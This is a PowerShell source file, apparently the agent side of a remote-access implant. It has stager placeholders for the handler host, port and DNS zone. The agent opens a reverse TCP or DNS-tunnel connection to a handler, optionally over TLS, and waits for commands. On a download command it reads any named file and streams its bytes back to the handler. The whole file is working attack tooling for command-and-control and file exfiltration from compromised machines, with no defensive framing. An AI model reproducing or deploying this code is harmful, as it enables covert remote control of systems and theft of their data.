

function Handle-Message([PSObject] $transport, [PSObject] $msg) {
    if ($msg.channelnumber -eq $MESSAGE_CHANNEL_COMMAND) {
        if ($msg.mtype -eq $MESSAGE_TYPE_COMMAND) {
            # TODO: handle command
            return $false
        } elseif ($msg.mtype -eq $MESSAGE_TYPE_MESSAGE) {
            $text = New-Object String($msg.content, 0, $msg.leng)
            Write-Host '[+] HANDLER:' $text
            return $true
        } elseif ($msg.mtype -eq $MESSAGE_TYPE_ERRORMESSAGE) {
            $text = New-Object String($msg.content, 0, $msg.leng)
            Write-Host '[-] ERROR: HANDLER:' $text
            return $true
        } elseif ($msg.mtype -eq $MESSAGE_TYPE_DOWNLOADCOMMAND) {
            $downloadchannelid = [Int16][BitConverter]::ToInt16($msg.content, 0)
	        $downloadchannelid = [UInt16][System.Net.IPAddress]::NetworkToHostOrder([Int16]$downloadchannelid)
	        $filenamelen = ($msg.leng) - 2
            $filename = New-Object String($msg.content, 2, $filenamelen)
            Command-SendFile $downloadchannelid $filename $transport
        } elseif ($msg.mtype -eq $MESSAGE_TYPE_EOC) {
            Write-Host '[-] ERROR: received close message from handler, exiting...'
            Channel-setClosed $Channels[$MESSAGE_CHANNEL_COMMAND]
            return $true
        } else {
            # TODO: implement other types
            Write-Host 'ERROR: message with invalid type received:' $msg.mtype
            return $false
        }
    } else {
        # TODO: implement other channels
        Write-Host 'ERROR: message for invalid channel received:' $msg.channelnumber
        return $false
    }
}

function Command-SendFile([UInt16] $downloadchannelid, [string] $filename, [PSObject] $transport) {
    Write-Host '[+] sending file to handler:' $filename
    Write-Host '[+] opening channel:' $downloadchannelid

    if ($Channels.ContainsKey($downloadchannelid)) {
        Write-Host "ERROR: download channel id is already in use"
        return
    }

    $Channels.Add($downloadchannelid, (Channel-Open))
    Channel-setOpen $Channels[$downloadchannelid]


    try {
        $fs = new-object IO.FileStream($filename, [IO.FileMode]::Open)
        Write-Host "[+] file has" $fs.Length "bytes"
        # TODO: send file size to handler
        $fs.Close()
    } catch {
        Write-Host "ERROR: could not open file for reading"
        # TODO: send error to handler!
        return
    }


    $script = {
        param([string]$filename, [PSObject]$channel)
        Write-Output $filename
        Write-Output $channel

        $fs = new-object IO.FileStream($filename, [IO.FileMode]::Open)

        $buf = new-object byte[] 1024

        $reader = new-object IO.BinaryReader($fs)
        while ($true) {
            $br = $reader.Read($buf, 0, 1024)
            if ($br -eq 0) {
                break;
            }
            #Channel-Write $channel $buf $br # cannot call this function from job, hacking it
            for($i=0; $i -lt $br; ++$i) {
                $channel.sendqueue.Enqueue($buf[$i])
            }
            Write-Output "wrote" $br "bytes"
        }
        $reader.Close()
        #Channel-setClosed $channel # cannot call this function from job, hacking it
        $channel.state = "CLOSED"
        Write-Output $channel.sendqueue.Count

    }

    $p = [PowerShell]::Create()
    $null = $p.AddScript($script).AddArgument($filename).AddArgument($Channels[$downloadchannelid])
    $job = $p.BeginInvoke()
    Write-Host "DEBUG: started backgroud write process"

    #Write-Host $Channels[$downloadchannelid].sendqueue.Count
    #$done = $job.AsyncWaitHandle.WaitOne()
    #$p.EndInvoke($job)
    #Write-Host $Channels[$downloadchannelid].sendqueue.Count
}


# Recycle stager variables
if ($fp) {
    $servercertfp = $fp
} else {
    $servercertfp = "SYREPLACE_SERVERCERTFINGERPRINT"
}

$CONNECTIONMETHOD = "SYREPLACE_CONNECTIONMETHOD"
$CHANNELENCRYPTION = "SYREPLACE_CHANNELENCRYPTION"
$CONNECTHOST = "SYREPLACE_CONNECTHOST"
$CONNECTPORT = "SYREPLACE_CONNECTPORT"
$DNSZONE = "SYREPLACE_DNSZONE"
$DNSSERVER = "SYREPLACE_DNSSERVER"
$TIMEOUT = "SYREPLACE_TIMEOUT"
$RETRIES = "SYREPLACE_RETRIES"

$Channels = @{ $MESSAGE_CHANNEL_COMMAND = Channel-Open }

if ($CONNECTIONMETHOD -eq "REVERSETCP") {
    $initialtransport = Transport-ReverseTcp-Open -LHost $CONNECTHOST -LPort $CONNECTPORT
} elseif ($CONNECTIONMETHOD -eq "DNS") {
    $initialtransport = Transport-Dns-Open -Zone $DNSZONE -DnsServer $DNSSERVER -timeout $TIMEOUT -retries $RETRIES
} else {
    Write-Output "ERROR: connection method not defined"
    Exit(1)
}

if ($CHANNELENCRYPTION -eq "NONE") {
    Write-Output "Warning: CONNECTION UNENCRYPTED"
    $transport = $initialtransport
} elseif ($CHANNELENCRYPTION -eq "TLS") {
    if ($CONNECTIONMETHOD -eq "REVERSETCP") {
        $stream = $initialtransport.tcpStream
    } elseif ($CONNECTIONMETHOD -eq "DNS") {
        $stream = $initialtransport.stream
    }
    $transport = Transport-Tls-Open $stream $servercertfp
} else {
    Write-Output "ERROR: wrapper method not defined"
    Exit(1)
}

Channel-setOpen $Channels[$MESSAGE_CHANNEL_COMMAND]

# show hello message from handler
$res = Message-ParseFromTransport $transport
$res = Handle-Message $transport $res

#Write-Host "DEBUG: sending hello to handler"

# send hello message to handler
$text = [System.Text.Encoding]::UTF8.GetBytes("Hello from Agent")
$message1 = Message-Create -MType $MESSAGE_TYPE_MESSAGE -ChannelNumber $MESSAGE_CHANNEL_COMMAND -Content $text
Message-SendToTransport $message1 $transport

#Write-Host "DEBUG: send hello to handler"

# wait for command
$res = Message-ParseFromTransport $transport
$res = Handle-Message $transport $res

# send data
while (Channel-isOpen $Channels[$MESSAGE_CHANNEL_COMMAND]) {

    # store list of channels that can be closed now
    $channelstoremove = @{ }

    # send data for each channel
    foreach ($chanid in $Channels.Keys) {
        if (Channel-HasDataToSend($Channels[$chanid])) {
            Write-Host "DEBUG: sending data"
            $data = Channel-ReadToSend $Channels[$chanid] $MESSAGE_MAX_DATA_LEN
            $msg = Message-Create -MType $MESSAGE_TYPE_DATA -ChannelNumber $chanid -Content $data
            Message-SendToTransport $msg $transport
        } elseif (Channel-isClosed($Channels[$chanid])) {
            Write-Host "DEBUG: sending EOC"
            $msg = Message-Create -MType $MESSAGE_TYPE_EOC -ChannelNumber $chanid -Content $MESSAGE_EMPTY_CONTENT
            Message-SendToTransport $msg $transport
            $channelstoremove.Add($chanid, $chanid)
        }
    }

    # remove closed channels from list
    foreach ($chanid in $channelstoremove.Keys) {
        $Channels.Remove($chanid)
    }

}


if ($CHANNELENCRYPTION -eq "TLS") {
    Transport-Tls-Close $transport
}

if ($CONNECTIONMETHOD -eq "REVERSETCP") {
    Transport-ReverseTcp-Close $initialtransport
} elseif ($CONNECTIONMETHOD -eq "DNS") {
    Transport-Dns-Close $initialtransport
}